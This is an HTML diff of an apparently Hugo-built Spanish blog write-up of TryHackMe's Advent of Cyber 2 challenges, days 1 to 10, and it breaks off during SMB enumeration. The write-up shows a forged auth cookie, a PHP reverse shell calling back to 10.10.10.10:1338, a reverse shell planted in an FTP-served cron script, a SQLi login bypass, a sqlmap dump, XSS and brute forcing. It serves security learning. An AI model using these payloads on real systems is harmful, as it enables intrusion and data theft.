@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
+<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Advent of Cyber 2 de TryHackMe contiene una serie de retos orientados al aprendizaje de herramientas y conceptos de seguridad, liberados diariamente durante 25 dias.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.92.2" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1603,25 +1603,22 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/" class="single__tag" title="Tags">Tags</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/python/" class="single__tag" title="python">python</a></li>
-  
-
   <li><a href="https://sckull.github.io/tags/web/" class="single__tag" title="web">web</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/blue/" class="single__tag" title="blue">blue</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/networking/" class="single__tag" title="networking">networking</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/reversing/" class="single__tag" title="reversing">reversing</a></li>
   
 
+  <li><a href="https://sckull.github.io/tags/networking/" class="single__tag" title="networking">networking</a></li>
+  
+
   <li><a href="https://sckull.github.io/tags/scripting/" class="single__tag" title="scripting">scripting</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/python/" class="single__tag" title="python">python</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/blue/" class="single__tag" title="blue">blue</a></li>
   
 
 </ul>
@@ -1668,63 +1665,63 @@
 </tr>
 </tbody>
 </table>
-<h1 id="day-1---web-exploitation-">DAY 1 - Web Exploitation</h1>
+<h1 id="day-1---web-exploitation">DAY 1 - Web Exploitation</h1>
 <p>Presentan una web donde es necesario crear una cuenta y obtener diferentes valores.<br />
 <img src="/images/posts/thm/aoc2/Screenshot_20201210_215214.png" alt="image" /></p>
 <p>Primero es necesario crear una cuenta, luego de eso ingresar con las credenciales, y con la herramienta para desarrolladores de firefox obtenemos la cookie y el nombre de la misma.<br />
 <img src="/images/posts/thm/aoc2/Screenshot_20201210_215522.png" alt="image" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">auth:7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a22757365726e616d65227d
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">auth:7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a22757365726e616d65227d
 </code></pre></td></tr></table>
 </div>
 </div><p>Utilizando <a href="https://gchq.github.io/CyberChef/"><strong>CyberCheff</strong></a> logramos obtener el valor real de la cookie el cual esta codificado en <code>hexadecimal</code> y esta en formato <code>json</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">{</span><span class="s2">&#34;company&#34;</span>:<span class="s2">&#34;The Best Festival Company&#34;</span>, <span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;username&#34;</span><span class="o">}</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">{</span><span class="s2">&#34;company&#34;</span>:<span class="s2">&#34;The Best Festival Company&#34;</span>, <span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;username&#34;</span><span class="o">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Para poder realizar un &ldquo;bypass&rdquo; utilizamos el formato de la cookie y la codificacion utilizada, pasandole como usuario santa y codificandola nuevamente.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">{</span><span class="s2">&#34;company&#34;</span>:<span class="s2">&#34;The Best Festival Company&#34;</span>, <span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;santa&#34;</span><span class="o">}</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">{</span><span class="s2">&#34;company&#34;</span>:<span class="s2">&#34;The Best Festival Company&#34;</span>, <span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;santa&#34;</span><span class="o">}</span>
 7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d
 </code></pre></td></tr></table>
 </div>
 </div><p>Utilizando nuevamente la herramienta para desarrolladores de firefox en la seccion de <code>Storage &gt; Cookies</code>, creamos una nueva cookie con los valores:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">Name: auth
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Name: auth
 value: 7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/aoc2/Screenshot_20201210_222034.png" alt="image" /></p>
 <p>Al recargar la pagina nos muestra las opciones pero en esta ocacion podemos activar todas y obtener nuestra flag.<br />
 <img src="/images/posts/thm/aoc2/Screenshot_20201210_222200.png" alt="image" /></p>
-<h1 id="day-2---web-exploitation-">DAY 2 - Web Exploitation</h1>
+<h1 id="day-2---web-exploitation">DAY 2 - Web Exploitation</h1>
 <p>Presentan un reto del tipo web donde nos dan un ID para auditar la aplicacion. Además se presenta un mensaje que indica que debemos de pasar el ID al parametro <code>?id=</code> a la aplicacion</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">For Elf McEager:
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">For Elf McEager:
 You have been assigned an ID number <span class="k">for</span> your audit of the system: ODIzODI5MTNiYmYw . Use this to gain access to the upload section of the site.
 Good luck!
 </code></pre></td></tr></table>
@@ -1735,7 +1732,7 @@ Good luck!
 <p>En el codigo fuente de la pagina se muestra las extensiones aceptadas (<code>.jpeg,.jpg,.png</code>) de los archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1749,7 +1746,7 @@ Good luck!
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
 	<span class="p">&lt;</span><span class="nt">ul</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;lightrope&#34;</span><span class="p">&gt;&lt;</span><span class="nt">li</span><span class="p">&gt;</span>[... snip ...]<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
 	<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">nose</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
 	<span class="p">&lt;</span><span class="nt">main</span><span class="p">&gt;</span>
@@ -1768,27 +1765,27 @@ Good luck!
 <p>Para obtener nuestra flag creamos un archivo que contiene codigo en PHP para poder ejecutar una shell inversa.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ cat shell.jpg.php
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ cat shell.jpg.php
 &lt;?php exec<span class="o">(</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1338 0&gt;&amp;1&#39;</span><span class="o">)</span><span class="p">;</span> ?&gt;
 </code></pre></td></tr></table>
 </div>
 </div><p>Con netcat a la escucha (<code>rlwrap nc -lvp 1338</code>), subimos nuestro archivo y visitamos el mismo como si fuera un pagina normal, lo cual ejecuto nuestra shell inversa y logramos obtener una shell y nuestra flag.<br />
 <img src="/images/posts/thm/aoc2/Screenshot_20201210_224649.png" alt="image" /></p>
-<h1 id="day-3---web-exploitation-">DAY 3 - Web Exploitation</h1>
+<h1 id="day-3---web-exploitation">DAY 3 - Web Exploitation</h1>
 <p>Nos presentan una pagina a la cual hay que realizar un ataque de fuerza bruta utilizando la herramienta <strong>Burpsuite</strong> tal y como se presenta en la descripcion del reto. Tambien proveen una lista de usuarios y contraseñas.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">Usuario  Contraseña
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Usuario  Contraseña
 root 	root
 admin 	password
 user 	<span class="m">12345</span>
@@ -1804,13 +1801,13 @@ user 	<span class="m">12345</span>
 <img src="/images/posts/thm/aoc2/Screenshot_20201210_230310.png" alt="image" /></p>
 <p>Utilizamos usuario y contraseña encontrado para obtener nuestra flag en la pagina.<br />
 <img src="/images/posts/thm/aoc2/Screenshot_20201210_230546.png" alt="image" /></p>
-<h1 id="day-4---web-exploitation-">DAY 4 - Web Exploitation</h1>
+<h1 id="day-4---web-exploitation">DAY 4 - Web Exploitation</h1>
 <p>Este dia presentan un reto web que incluye la explicacion del uso de herramientas WFUZZ y GOBUSTER para realizar fuzzing en paginas web. Tambien presentan que el parametro (<code>date</code>) del reto toma como valor una fecha en el formato <code>YYYYMMDD</code>.<br />
 <img src="/images/posts/thm/aoc2/Screenshot_20201212_124014.png" alt="image" /></p>
 <p>Para obtener la flag, primero es necesario ejecutar gobuster a la pagina web con el diccionario <code>big.txt</code> el cual nos muestra como resultado una direccion donde se encuentra una pagina web.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1834,7 +1831,7 @@ user 	<span class="m">12345</span>
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.57.57/ -w /usr/share/wordlists/dirb/big.txt 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.57.57/ -w /usr/share/wordlists/dirb/big.txt 
 <span class="o">===============================================================</span>
 Gobuster v3.0.1
 by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
@@ -1862,7 +1859,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 <p>A dicha pagina web es necesario realizar fuzzing al parametro <code>date</code> para ello debemos de utilizar algun diccionario que contenga el formato <code>YYYYMMDD</code>, en este caso utilizamos python para generar nuestro diccionario en el formato presentado especificando año, mes y dia.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1878,7 +1875,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
 
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1990</span><span class="p">,</span> <span class="mi">2021</span><span class="p">):</span>
 	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">13</span><span class="p">):</span>
@@ -1887,7 +1884,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 			<span class="n">m</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="k">if</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="k">else</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
 			<span class="n">d</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="k">if</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="k">else</span> <span class="nb">str</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>			
 			
-			<span class="k">print</span><span class="p">(</span><span class="n">y</span><span class="o">+</span><span class="n">m</span><span class="o">+</span><span class="n">d</span><span class="p">)</span>
+			<span class="nb">print</span><span class="p">(</span><span class="n">y</span><span class="o">+</span><span class="n">m</span><span class="o">+</span><span class="n">d</span><span class="p">)</span>
 	<span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
 	<span class="n">j</span><span class="o">+=</span><span class="mi">1</span>
 	<span class="n">k</span><span class="o">+=</span><span class="mi">1</span>
@@ -1897,7 +1894,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 </div><p>Utilizamos <code>WFUZZ</code> para pasarle los valores del diccionario al parametro <code>date</code> y ocultamos todas las solicitudes que tuvieran 0 caracteres (<code>--hh 0</code>), logrando obtener la fecha en donde se presenta nuestra flag.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1920,7 +1917,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ wfuzz -c -z file,dates.txt --hh <span class="m">0</span> http://10.10.57.57/api/site-log.php?date<span class="o">=</span>FUZZ
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ wfuzz -c -z file,dates.txt --hh <span class="m">0</span> http://10.10.57.57/api/site-log.php?date<span class="o">=</span>FUZZ
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="err">&#39;</span>s documentation <span class="k">for</span> more information.
 
@@ -1944,7 +1941,7 @@ Requests/sec.: 27.50925
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/aoc2/Screenshot_20201212_130921.png" alt="image" /></p>
-<h1 id="day-5---web-exploitation-">DAY 5 - Web Exploitation</h1>
+<h1 id="day-5---web-exploitation">DAY 5 - Web Exploitation</h1>
 <p>Se presenta una aplicacion web vulnerable a SQLi de la cual nos dan la &ldquo;documentacion&rdquo;:</p>
 <p><em>Santa&rsquo;s TODO: Look at alternative database systems that are better than sqlite. Also, don&rsquo;t forget that you installed a Web Application Firewall (WAF) after last year&rsquo;s attack. In case you&rsquo;ve forgotten the command, you can tell SQLMap to try and bypass the WAF by using &ndash;tamper=space2comment</em></p>
 <p>En la primera tarea preguntan por el panel de logeo, la pista dada es suficiente para obtener la respuesta. En el panel realizamos &ldquo;bypass&rdquo; utilizando el payload <code>' or true; --</code> en el campo de <strong>username</strong>.<br />
@@ -1954,7 +1951,7 @@ Requests/sec.: 27.50925
 <p>Utilizando SQLMAP y Burpsuite para obtener los datos de la base de datos tal y como se explica en la descripcion del reto de este dia, tomando en cuenta que la aplicacion cuenta con un WAF utilizamos un tamper para &ldquo;camuflar&rdquo; los payloads y como base de datos se especifica que es <strong>sqlite</strong> como lo indica la &ldquo;documentacion&rdquo;.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2005,7 +2002,7 @@ Requests/sec.: 27.50925
 </span><span class="lnt">49
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#sqlmap -r santaspanel.txt --dbms=sqlite --tamper=space2comment --dump-all</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#sqlmap -r santaspanel.txt --dbms=sqlite --tamper=space2comment --dump-all</span>
 
 Database: SQLite_masterdb
 Table: users
@@ -2056,19 +2053,19 @@ Table: hidden_table
 +-----------------------------------------+
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="day-6---web-exploitation-">DAY 6 - Web Exploitation</h1>
+</div><h1 id="day-6---web-exploitation">DAY 6 - Web Exploitation</h1>
 <p>La aplicacion dada es vulnerable a XSS y utilizando OWASP ZAP es posible obtener las diferentes alertas de XSS. Para responder las preguntas de este reto es necesario explotar el campo <code>New Book...</code> y utilizar OWASP ZAP.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/aoc2/Screenshot_20201214_091319.png" alt="image" /><br />
 <img src="/images/posts/thm/aoc2/Screenshot_20201214_091924.png" alt="image" /></p>
-<h1 id="day-7---networking-">DAY 7 - Networking</h1>
+<h1 id="day-7---networking">DAY 7 - Networking</h1>
 <p>Se un archivo comprimido con varios archivos de captura de paquetes a los cuales hay que realizar un analisis utilizando wireshark y los filtros descritos y explicados en la descripcion del reto del dia.</p>
 <ul>
 <li>
@@ -2091,7 +2088,7 @@ Table: hidden_table
 <img src="/images/posts/thm/aoc2/Screenshot_20201214_095903.png" alt="image" /></p>
 </li>
 </ul>
-<h1 id="day-8---networking-">DAY 8 - Networking</h1>
+<h1 id="day-8---networking">DAY 8 - Networking</h1>
 <p>Se presenta una IP en la cual hay que realizar un escaneo de puertos, sistema operativo y ejecutar scripts con nmap. Tambien una serie de preguntas relacionada a sintaxis e informacion obtenida.</p>
 <ul>
 <li>
@@ -2103,7 +2100,7 @@ Table: hidden_table
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2116,7 +2113,7 @@ Table: hidden_table
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#nmap tbfc.blog</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#nmap tbfc.blog</span>
 Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-12-14 11:07 EST
 Nmap scan report <span class="k">for</span> tbfc.blog <span class="o">(</span>10.10.1.235<span class="o">)</span>
 Host is up <span class="o">(</span>0.32s latency<span class="o">)</span>.
@@ -2139,7 +2136,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2151,7 +2148,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ nmap --script http-title -p <span class="m">80</span> tbfc.blog
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ nmap --script http-title -p <span class="m">80</span> tbfc.blog
 Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-12-14 11:12 EST
 Nmap scan report <span class="k">for</span> tbfc.blog <span class="o">(</span>10.10.1.235<span class="o">)</span>
 Host is up <span class="o">(</span>0.79s latency<span class="o">)</span>.
@@ -2163,10 +2160,10 @@ PORT   STATE SERVICE
 Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 3.74 seconds
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="day-9---networking-">DAY 9 - Networking</h1>
+</div><h1 id="day-9---networking">DAY 9 - Networking</h1>
 <p>Un servicio FTP esta expuesto en la IP del reto en la cual se ingresa como <strong>&ldquo;anonymous&rdquo;</strong>, la descripcion del reto dá suficiente informacion para resolver cada una de las tareas y obtener la flag. En la primera pestaña tenemos la conexion con el servicio donde logramos obtener el archivo <code>backup.sh</code> y <code>shoppinglist.txt</code>, el archivo backup se ejecuta cada cierto tiempo, agregamos una shell inversa y volvimos a subir el archivo en el servicio FTP, con netcat a la escucha logramos obtener una shell y nuestra flag <code>root.txt</code>.</p>
 
-<div id="8cffdf025cd0db84" class="codetab">
+<div id="0ec39f52cd714826" class="codetab">
   <div class="codetab__links">
     
       <button class="codetab__link" aria-label="Tab link">bash</button>
@@ -2180,7 +2177,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 <div id="131d7a836d59abfd" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2228,7 +2225,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </span><span class="lnt">46
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ ftp 10.10.99.86
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ ftp 10.10.99.86
 Connected to 10.10.99.86.
 <span class="m">220</span> Welcome to the TBFC FTP Server!.
 Name <span class="o">(</span>10.10.99.86:kali<span class="o">)</span>: anonymous
@@ -2283,7 +2280,7 @@ ftp&gt;
 <div id="9965c65535b08dfb" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2314,7 +2311,7 @@ ftp&gt;
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ cat backup.sh 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ cat backup.sh 
 <span class="c1">#!/bin/bash</span>
 
 <span class="c1"># Created by ElfMcEager to backup all of Santa&#39;s goodies!</span>
@@ -2354,7 +2351,7 @@ kali@kali:~/thm/adventcyber2$
 <script>
   'use strict';
 
-  var containerId = JSON.parse("\"8cffdf025cd0db84\"");
+  var containerId = JSON.parse("\"0ec39f52cd714826\"");
   var containerElem = document.getElementById(containerId);
   var codetabLinks = null;
   var codetabContents = null;
@@ -2389,10 +2386,10 @@ kali@kali:~/thm/adventcyber2$
   }
 </script>
 <p><img src="/images/posts/thm/aoc2/Screenshot_20201214_102943.png" alt="image" /></p>
-<h1 id="day-10---networking-">DAY 10 - Networking</h1>
+<h1 id="day-10---networking">DAY 10 - Networking</h1>
 <p>Un servicio SAMBA esta expuesto en la IP del reto, la descripcion del reto dá suficiente informacion para resolver cada una de las tareas con las herramientas <code>enum4linux</code> y <code>smbclient</code>. Se realiza un escaneo con enum4linux para busqueda de nombres de usuarios y SHARENAMES con los cuales verificamos en cual de estos SHARENAMES permite entrar sin ninguna credencial.</p>
 
-<div id="521f83c69789640e" class="codetab">
+<div id="d4c63b21b382b2ad" class="codetab">
   <div class="codetab__links">
     
       <button class="codetab__link" aria-label="Tab link">bash</button>
@@ -2405,7 +2402,7 @@ kali@kali:~/thm/adventcyber2$
 <div id="6504ed350813d4f6" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2449,7 +2446,7 @@ kali@kali:~/thm/adventcyber2$
 </span><span class="lnt">42
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ enum4linux -S -U 10.10.77.26 2&gt;/dev/null
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ enum4linux -S -U 10.10.77.26 2&gt;/dev/null
 Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Mon Dec <span class="m">14</span> 11:45:44 <span class="m">2020</span>
 
 <span class="o">[</span>... snip ...<span class="o">]</span>
@@ -2500,7 +2497,7 @@ enum4linux <span class="nb">complete</span> on Mon Dec <span class="m">14</span>
 <div id="cfe55eeceaf224e6" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2530,7 +2527,7 @@ enum4linux <span class="nb">complete</span> on Mon Dec <span class="m">14</span>
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ smbclient <span class="se">\\\\</span>10.10.77.26<span class="se">\\</span>tbfc-hr
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ smbclient <span class="se">\\\\</span>10.10.77.26<span class="se">\\</span>tbfc-hr
 Enter WORKGROUP<span class="se">\k</span>ali<span class="s1">&#39;s password: 
 </span><span class="s1">tree connect failed: NT_STATUS_ACCESS_DENIED
